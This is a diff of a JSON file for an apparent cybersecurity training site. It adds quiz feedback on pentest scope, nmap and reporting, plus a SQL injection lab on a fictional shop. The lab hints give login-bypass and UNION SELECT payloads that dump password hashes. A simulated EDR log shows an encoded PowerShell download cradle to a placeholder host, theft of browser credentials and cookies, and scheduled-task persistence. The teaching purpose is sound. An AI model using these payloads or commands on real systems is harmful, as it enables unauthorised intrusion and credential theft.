+      "pc",
+      "discover 10.10.10.0/24",
+      "Checks every address from 10.10.10.0 to 10.10.10.255 and lists the hosts that answer."
+     ]
+    ],
     "check": {
      "found": true
     }
@@ -5287,6 +6461,17 @@
     "id": "oos",
     "text": "A teammate suggests checking 10.10.10.0's neighbour 10.10.20.5. Try it, and notice what the tool does.",
     "hint": "discover 10.10.20.5",
+    "nudge": "Point the scanner at the address your teammate suggested, and read what it says.",
+    "why": "Tools and teammates will happily point you outside scope. Noticing and stopping is part of the job.",
+    "found": "The tool refused, because 10.10.20.5 is outside the range you were given. A teammate's suggestion isn't permission.",
+    "walk": [
+     [
+      "kali",
+      "pc",
+      "discover 10.10.20.5",
+      "10.10.20.5 isn't in 10.10.10.0/24. The tool refuses; in real life, testing it could be illegal."
+     ]
+    ],
     "check": {
      "refused": true
     }
@@ -5295,6 +6480,17 @@
     "id": "ports",
     "text": "Look at the open ports on the web host inside scope.",
     "hint": "discover 10.10.10.20",
+    "nudge": "Scan just the web host's address. The sweep listed it.",
+    "why": "Each open port is a service someone could attack: it's what goes in your report and gets checked for patches.",
+    "found": "web.lab answers on SSH (22), HTTP (80) and HTTPS (443): three services to check for weak logins and missing patches.",
+    "walk": [
+     [
+      "kali",
+      "pc",
+      "discover 10.10.10.20",
+      "Just the web host: SSH (22), HTTP (80) and HTTPS (443) answer."
+     ]
+    ],
     "check": {
      "found": true
     }
@@ -5343,7 +6539,13 @@
     ],
     "answer": 1,
     "explain": "203.0.113.64/26 covers .64 to .127, and it's listed as out of scope: the client doesn't own it, so they can't authorise it. Tell your contact; don't touch it.",
-    "where": "203.0.113.64/26"
+    "where": "203.0.113.64/26",
+    "notes": [
+     "Sharing the first three numbers doesn't put an address in scope. Check which ranges the rules list as out of scope.",
+     null,
+     "The time window only applies to systems in scope. This one isn't, at any hour.",
+     "Out of scope means not at all, passive or active: the client can't authorise testing a system it doesn't own."
+    ]
    },
    {
     "type": "text",
@@ -5366,7 +6568,13 @@
     ],
     "answer": 1,
     "explain": "The window is evenings and nights only, probably to keep the tenants' portal running smoothly during the day. Outside it, testing isn't authorised.",
-    "where": "19:00 to 07:00"
+    "where": "19:00 to 07:00",
+    "notes": [
+     "The days are right, but the rules set the hours too. Check the testing window.",
+     null,
+     "The window covers every system in scope, the portal included.",
+     "Telling someone isn't permission. Changes to the rules need agreement in writing."
+    ]
    },
    {
     "type": "choice",
@@ -5379,7 +6587,13 @@
     ],
     "answer": 2,
     "explain": "Guessing staff passwords could lock real people out and touch their data. The rules give you portal-test-01 and portal-test-02 to test logins safely.",
-    "where": "test accounts"
+    "where": "test accounts",
+    "notes": [
+     "Spraying staff accounts could lock real people out of their work. Check what the rules give you for testing logins.",
+     "Even a few guesses can lock real staff out, and their accounts aren't yours to try. Check what the rules provide instead.",
+     null,
+     "The portal is in scope. The problem is whose accounts you'd be guessing at."
+    ]
    },
    {
     "type": "choice",
@@ -5392,7 +6606,13 @@
     ],
     "answer": 1,
     "explain": "A screenshot proves the problem without taking personal data away. Copying it would make you a data breach. This is also critical enough to phone in straight away.",
-    "where": "screenshots"
+    "where": "screenshots",
+    "notes": [
+     "Any copy, even encrypted, takes personal data away from the client: that would make you the data breach.",
+     null,
+     "Ten rows of names and bank details are still personal data taken away. You need proof the file can be opened, not the data itself.",
+     "Just mentioning it isn't enough: the client needs proof, and this is serious enough to phone in now."
+    ]
    },
    {
     "type": "text",
@@ -5416,7 +6636,13 @@
     ],
     "answer": 1,
     "explain": "The client can't authorise testing of systems it doesn't own, and only the person named in the rules can change the scope, in writing. An email from someone else isn't authorisation.",
-    "where": "in writing"
+    "where": "in writing",
+    "notes": [
+     "The client can't authorise testing systems it doesn't own, so adding the range isn't theirs to approve.",
+     null,
+     "Quietly testing out of scope is unauthorised access, whatever day it is.",
+     "A reply saying 'approved' isn't authorisation. Who owns those servers, and who do the rules say can change the scope?"
+    ]
    }
   ],
   "next": [
@@ -5493,7 +6719,13 @@
     ],
     "answer": 1,
     "explain": "-Pn skips the \"is it up?\" check, useful when hosts ignore pings. That's why 203.0.113.12 shows as up even though nothing answered.",
-    "where": "-Pn"
+    "where": "-Pn",
+    "notes": [
+     "Scanning every port is -p- (all 65,535). -Pn changes a different part of the scan.",
+     null,
+     "Running without root is about the scan type (such as -sT), not -Pn.",
+     "It's the opposite: in -Pn the n means no. Think about which step that turns off."
+    ]
    },
    {
     "type": "text",
@@ -5517,7 +6749,13 @@
     ],
     "answer": 1,
     "explain": "Plain FTP sends the username and password unencrypted. SFTP (over SSH) or FTPS would protect them.",
-    "where": "21/tcp"
+    "where": "21/tcp",
+    "notes": [
+     "SSH encrypts everything, logins included.",
+     null,
+     "SMB has other problems, but it doesn't send passwords as plain text.",
+     "One of these does send logins in clear text. Which of these protocols has no encryption at all?"
+    ]
    },
    {
     "type": "choice",
@@ -5530,7 +6768,13 @@
     ],
     "answer": 2,
     "explain": "SMB is for file sharing inside a network. Exposed to the internet it invites password guessing and has a history of wormable flaws: WannaCry spread through SMB in 2017.",
-    "where": "445/tcp"
+    "where": "445/tcp",
+    "notes": [
+     "HTTPS is exactly what a public website should offer.",
+     "SSH facing the internet is common and fine with keys and a current version. Worth hardening, but SMB is far worse.",
+     null,
+     "Port 80 usually just redirects to HTTPS. Not ideal, but far less dangerous than SMB."
+    ]
    },
    {
     "type": "text",
@@ -5554,7 +6798,13 @@
     ],
     "answer": 1,
     "explain": "The 1000 most common ports gave no response at all. That doesn't prove nothing runs there: a firewall may only allow certain sources, or the service may use an uncommon port.",
-    "where": "ignored states"
+    "where": "ignored states",
+    "notes": [
+     "The output can't tell you that: with -Pn every host is assumed up, so a switched-off one would look exactly like this.",
+     null,
+     "Open ports would be listed. 'ignored states' here means none of them answered.",
+     "A crashed scan wouldn't report on the host. This one finished and summed up the result."
+    ]
    }
   ],
   "next": [
@@ -5605,7 +6855,13 @@
     ],
     "answer": 1,
     "explain": "Validating findings is part of the job. Saying how you checked lets the client trust the rest of the report.",
-    "where": "FINDING 1"
+    "where": "FINDING 1",
+    "notes": [
+     "Scanners get things wrong. Your manual check is better evidence than the scanner's guess.",
+     null,
+     "Raising a severity without evidence makes the whole report harder to trust.",
+     "Deleting it loses the record that you checked. The client should see what you tested and what you found."
+    ]
    },
    {
     "type": "choice",
@@ -5618,7 +6874,13 @@
     ],
     "answer": 1,
     "explain": "7.4p1 Debian 10+deb9u7 may already include fixes for some of the issues. Report what is still open, and if the release is past its support life, say that instead.",
-    "where": "backport"
+    "where": "backport",
+    "notes": [
+     "Not on Debian: security fixes are backported without changing the main version number.",
+     null,
+     "Fixing the client's systems isn't your job, or authorised. Report it, and they fix it.",
+     "Version findings are useful once checked. The point is to confirm them first."
+    ]
    },
    {
     "type": "choice",
@@ -5631,7 +6893,13 @@
     ],
     "answer": 1,
     "explain": "SMB facing the internet is reachable by anyone, invites password guessing and has a history of wormable flaws. Clear-text FTP matters too, but needs someone in a position to watch the traffic.",
-    "where": "FINDING 2"
+    "where": "FINDING 2",
+    "notes": [
+     "Clear-text FTP matters, but an attacker has to be able to watch the traffic first. Which finding can anyone on the internet reach?",
+     null,
+     "A default page gives away a little information. It's low risk.",
+     "They aren't equal: risk depends on who can reach it and what it leads to."
+    ]
    },
    {
     "type": "choice",
@@ -5644,7 +6912,13 @@
     ],
     "answer": 1,
     "explain": "Encrypting the connection protects the login. A different port or a longer password still crosses the network in clear text.",
-    "where": "FINDING 3"
+    "where": "FINDING 3",
+    "notes": [
+     "A longer password still crosses the network unencrypted, readable by anyone watching.",
+     null,
+     "A different port changes nothing: the login is still in clear text.",
+     "Blocking it one day a week leaves it exposed for the other six."
+    ]
    },
    {
     "type": "choice",
@@ -5656,7 +6930,13 @@
      "The tester's name"
     ],
     "answer": 1,
-    "explain": "The client's admins need to see it, understand why it matters and know what to do. A pasted scanner line rarely does that."
+    "explain": "The client's admins need to see it, understand why it matters and know what to do. A pasted scanner line rarely does that.",
+    "notes": [
+     "Pasted scanner text rarely shows the evidence, the impact or the fix the client needs.",
+     null,
+     "A score alone doesn't tell the admins what you saw or what to do about it.",
+     "Who tested goes on the report's cover, not in each finding."
+    ]
    }
   ],
   "next": [
@@ -5696,7 +6976,13 @@
     ],
     "answer": 0,
     "explain": "The first line (the shebang) asks for bash, $(seq 1 254) runs a command and uses its output, and blocks close with done and fi. PowerShell also uses $ for variables, but it has no fi or done.",
-    "where": "#!/usr/bin/env bash"
+    "where": "#!/usr/bin/env bash",
+    "notes": [
+     null,
+     "Python has no fi or done, and its first line would name python. Indented lines are normal in many languages.",
+     "PowerShell does use $ for variables, but it has no fi or done blocks. Read the very first line.",
+     "Ruby closes blocks with end. This script closes them with done and fi."
+    ]
    },
    {
     "type": "choice",
@@ -5709,7 +6995,13 @@
     ],
     "answer": 1,
     "explain": "seq 1 254 counts from 1 to 254, so the loop pings every address in 203.0.113.0/24. This year only .1 to .62 is in scope; .64 and up belong to someone else.",
-    "where": "seq 1 254"
+    "where": "seq 1 254",
+    "notes": [
+     "That's the range it should sweep this year, but seq 1 254 counts all the way up to 254.",
+     null,
+     "Every address gets pinged. Ping only decides which ones nmap then scans.",
+     "results.txt is where the output goes, not where the targets come from."
+    ]
    },
    {
     "type": "text",
@@ -5732,7 +7024,13 @@
     ],
     "answer": 1,
     "explain": "The nmap line sits inside if ping ... then. No ping reply, no scan, and nothing written. Many firewalls drop ping, so a real host can vanish from your results. nmap -Pn skips the ping check.",
-    "where": "if ping -c 1 -W 1"
+    "where": "if ping -c 1 -W 1",
+    "notes": [
+     "nmap never runs for it: look at where the nmap line sits in the script.",
+     null,
+     "Nothing is written for a host that doesn't answer, so it isn't marked at all.",
+     "A failed ping only skips that host. The loop carries on to the next address."
+    ]
    },
    {
     "type": "choice",
@@ -5745,7 +7043,13 @@
     ],
     "answer": 1,
     "explain": "One > overwrites a file; >> appends to it. With > each host would wipe out the one before. tee -a does the same append for the 'is up' line while also printing it.",
-    "where": ">> \"$OUT\""
+    "where": ">> \"$OUT\"",
+    "notes": [
+     "That's a single >. Two of them append instead of replacing.",
+     null,
+     "The output goes into the file. tee is what prints to the screen as well.",
+     "Running in the background needs & at the end of the line, not >>."
+    ]
    },
    {
     "type": "text",
@@ -5992,7 +7296,13 @@
     ],
     "answer": 1,
     "explain": "A scheduled task that runs at logon is a classic way to keep a foothold. Testers use it to prove the risk, then remove it, and the report says it was removed.",
-    "where": "runs at every logon"
+    "where": "runs at every logon",
+    "notes": [
+     "A logon task that anyone could reuse is a foothold, whatever it was made for. Testers remove it.",
+     null,
+     "A backup job wouldn't come from a test. This task was the tester's own.",
+     "It doesn't forward logs. It runs at every logon, which is how attackers keep their access."
+    ]
    },
    {
     "type": "text",
@@ -6015,7 +7325,13 @@
     ],
     "answer": 1,
     "explain": "The client's team added it through a change, so they remove it the same way, and the tester confirms it's closed. An allow rule for a test address left open is still a hole.",
-    "where": "CHG-2291"
+    "where": "CHG-2291",
+    "notes": [
+     "The tester's admin login is for testing, not for changing the client's firewall. Think about how the rule got there in the first place.",
+     null,
+     "An allow rule for a test address is still a hole once the test is over.",
+     "The rule is on the client's own firewall, not the internet provider's."
+    ]
    },
    {
     "type": "choice",
@@ -6028,7 +7344,13 @@
     ],
     "answer": 1,
     "explain": "The contract sets the retention. Personal data taken as evidence is protected while it's held, securely deleted on time, and the client gets written confirmation.",
-    "where": "securely deleted"
+    "where": "securely deleted",
+    "notes": [
+     "Keeping personal data forever breaks the contract and data protection law. It goes when the retention period ends.",
+     null,
+     "Emailing personal data makes another copy in more places. The contract sets how it's kept and when it's deleted.",
+     "Reports never include real personal data. They describe it."
+    ]
    }
   ]
  },
@@ -6171,6 +7493,68 @@
    {
     "label": "OWASP: SQL injection prevention cheat sheet",
     "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+   }
+  ]
+ },
+ {
+  "id": "sqli-shop",
+  "kind": "sqli",
+  "category": "Web & cloud",
+  "track": "Web security",
+  "minutes": 15,
+  "lesson": "web-sqli",
+  "safety": "webattack",
+  "title": "Break into the shop: SQL injection",
+  "skill": "Exploit SQL injection on a login form and a search box, read a database through it, then fix it with parameterised queries",
+  "card": "A real-looking shop, its database, and the fix",
+  "intro": "Wrenfield & Co's shop pastes what you type straight into its SQL. Use the site, watch the SQL change behind the scenes, break in, then fix the code.",
+  "simplification": "Wrenfield & Co and its people are fictional, and everything runs in this page: nothing is sent anywhere. The database is a small model of MySQL 8.0 (SELECT, WHERE, UNION, ORDER BY, LIMIT, comments, a few functions and information_schema) with MySQL's own error codes and wording; real databases support far more. The shop's PHP is shown, not run. Real sites should also hide database errors from visitors and store passwords with a slow, salted hash (see the hashing lab), not plain SHA-256.",
+  "tasks": [
+   {
+    "id": "sign-in",
+    "text": "Sign in normally with the test account, and see the SQL the login sends.",
+    "hint": "Username j.okafor, password Biscuit-Tin-42. Then open Behind the scenes: The SQL.",
+    "why": "Your username and password were pasted between quote marks in the SQL. Anything you type there becomes part of the query."
+   },
+   {
+    "id": "break",
+    "text": "Make the site show a database error.",
+    "hint": "Type a single quote (') as the username. It closes the quote early and leaves the SQL broken.",
+    "why": "A verbose error tells an attacker the database is MySQL and that input reaches the SQL unfiltered. Real sites should log errors, not show them."
+   },
+   {
+    "id": "bypass",
+    "text": "Sign in as admin without knowing the admin password.",
+    "hint": "Username: admin' -- (with a space after the two dashes). The quote ends the username, and -- turns the password check into a comment. # works too.",
+    "why": "The database only ever saw WHERE username = 'admin'. The password check had been commented out of the query."
+   },
+   {
+    "id": "union",
+    "text": "In the shop search, make a UNION SELECT that the database accepts.",
+    "hint": "Both halves of a UNION need the same number of columns. Try ' ORDER BY 4 --  then 3, or ' UNION SELECT 1, 2, 3 -- (each with a space at the end).",
+    "why": "The search returns 3 columns (name, price, description), so your SELECT needs 3 too. Your numbers showed up as a product."
+   },
+   {
+    "id": "dump",
+    "text": "Use the search to list every username and password hash from the users table.",
+    "hint": "zzz' UNION SELECT username, password_hash, role FROM users -- (zzz matches no products, so only the users show). Stuck on the names? information_schema.tables and information_schema.columns list them.",
+    "why": "The shop's own product grid displayed its user table. Unsalted SHA-256 hashes like these fall quickly to a cracking wordlist."
+   },
+   {
+    "id": "fix",
+    "text": "Tick \"Fix the code\" and try your admin sign-in again.",
+    "hint": "Tick the box under the objectives, go to Sign in, and use admin' -- again.",
+    "why": "With a prepared statement the SQL is fixed first and your input is sent separately as a value, so the quote and dashes are just characters in a username nobody has."
+   }
+  ],
+  "next": [
+   {
+    "label": "OWASP: SQL injection prevention cheat sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+   },
+   {
+    "label": "PortSwigger Web Security Academy: SQL injection (free labs)",
+    "url": "https://portswigger.net/web-security/sql-injection"
    }
   ]
  },
@@ -6495,6 +7879,7 @@
    "kind": "log",
    "name": "EDR process tree: ASH-LT07",
    "text": "Simulated EDR process tree (simplified export), Ashgrove Joinery (fictional), laptop ASH-LT07 (Windows 11 23H2), user ASH\\k.patel, 18 Nov 2026, times UTC.\nSimplified: indented lines are child processes; real exports carry hashes, IDs and many more fields.\n\n10:01:52  FILE      C:\\Users\\k.patel\\Downloads\\Invoice_Nov_2026.zip saved by msedge.exe (from an email link)\n10:02:14  PROCESS   explorer.exe\n10:02:14    PROCESS   wscript.exe \"C:\\Users\\k.patel\\Downloads\\Invoice_Nov_2026\\Invoice_Nov_2026.pdf.js\"\n10:02:16      PROCESS   powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBi...\n10:02:19        NETWORK   powershell.exe -> 203.0.113.91:443 (cdn-update.example.com, first seen in the company today)\n10:02:20        FILE      created C:\\Users\\k.patel\\AppData\\Roaming\\WinSvc\\winsvc.exe (unsigned)\n10:02:21        PROCESS   C:\\Users\\k.patel\\AppData\\Roaming\\WinSvc\\winsvc.exe\n10:02:24          FILE READ C:\\Users\\k.patel\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\n10:02:24          FILE READ C:\\Users\\k.patel\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\n10:02:31          NETWORK   winsvc.exe -> 203.0.113.91:443 (2.3 MB sent)\n10:02:33          PROCESS   schtasks.exe /Create /SC ONLOGON /TN \"WinSvc Update\" /TR \"C:\\Users\\k.patel\\AppData\\Roaming\\WinSvc\\winsvc.exe\"\n10:03:33  NETWORK   winsvc.exe -> 203.0.113.91:443 every 60 seconds since (14 connections, small replies)\n\nAnalyst's note: the -EncodedCommand text decodes to IEX (New-Object Net.WebClient).DownloadString('https://cdn-update.example.com/u')",
+   "tree": true,
    "placeholder": "e.g. winsvc"
   },
   "steps": [
